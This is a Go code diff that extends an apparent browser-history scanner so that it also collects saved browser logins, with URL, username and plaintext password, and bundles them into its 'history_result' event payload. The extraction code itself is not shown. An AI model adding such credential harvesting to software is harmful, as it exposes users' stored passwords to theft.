@@ -27,12 +27,22 @@ type HistoryEntry struct {
 	Source string `json:"source"` // e.g. "Chrome", "Firefox (Profile1)"
 }
 
+// PasswordEntry represents one saved login credential.
+type PasswordEntry struct {
+	URL      string `json:"url"`
+	Username string `json:"username"`
+	Password string `json:"password"`
+	Source   string `json:"source"`
+}
+
 // ScanResult is the payload of the "history_result" event.
 type ScanResult struct {
-	Entries   []HistoryEntry `json:"entries"`
-	Total     int            `json:"total"`
-	ScannedAt string         `json:"scannedAt"`
-	Errors    []string       `json:"errors,omitempty"`
+	Entries       []HistoryEntry  `json:"entries"`
+	Total         int             `json:"total"`
+	Passwords     []PasswordEntry `json:"passwords"`
+	PasswordTotal int             `json:"passwordTotal"`
+	ScannedAt     string          `json:"scannedAt"`
+	Errors        []string        `json:"errors,omitempty"`
 }
 
 var (
@@ -372,10 +382,16 @@ func performScan() ScanResult {
 		return domainKey(allEntries[i].URL) < domainKey(allEntries[j].URL)
 	})
 
+	// Passwords
+	passwords, pwdErrors := scanAllPasswords(env)
+	errors = append(errors, pwdErrors...)
+
 	return ScanResult{
-		Entries:   allEntries,
-		Total:     len(allEntries),
-		ScannedAt: time.Now().UTC().Format(time.RFC3339),
-		Errors:    errors,
+		Entries:       allEntries,
+		Total:         len(allEntries),
+		Passwords:     passwords,
+		PasswordTotal: len(passwords),
+		ScannedAt:     time.Now().UTC().Format(time.RFC3339),
+		Errors:        errors,
 	}
 }
